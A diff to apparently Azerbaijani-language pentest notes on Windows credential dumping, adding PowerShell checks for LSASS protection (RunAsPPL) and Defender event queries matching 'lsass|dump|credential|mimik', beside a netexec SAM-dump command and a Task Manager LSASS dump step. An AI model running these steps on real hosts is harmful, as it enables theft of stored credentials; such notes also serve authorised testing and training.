@@ -28,9 +28,24 @@ netexec smb <IP> --local-auth -u <USER> -p <PASS> --sam
 # LSASS Dump
 
 LSASS Dump Technique:
-HKLM\SYSTEM\CurrentControlSet\Control\Lsa
-RunAsPPL = 1 olarsa mümkün deyil.
-RunAsPPL = 0 olarsa davam et
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPL -ErrorAction SilentlyContinue
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name RunAsPPLBoot -ErrorAction SilentlyContinue
+
+Dəyər Yoxdursa RunAsPPL = 0
+
+Get-Process lsass | Select-Object Name,Protection
+
+Name  Protection
+----  ----------  ( LSASS Dump mümkün )
+lsass
+
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
+Where-Object {
+    $_.Message -match "lsass|dump|credential|mimik"
+} |
+Select TimeCreated,Id,Message -First 10
+
+Blocked, Credential theft, Unauthorized memory access ( LSASS Dump Defender tərəfindən bloklanır )
 
 
 1) Task Manager --> Local Security Authority Process --> Create dump file ( %temp% )
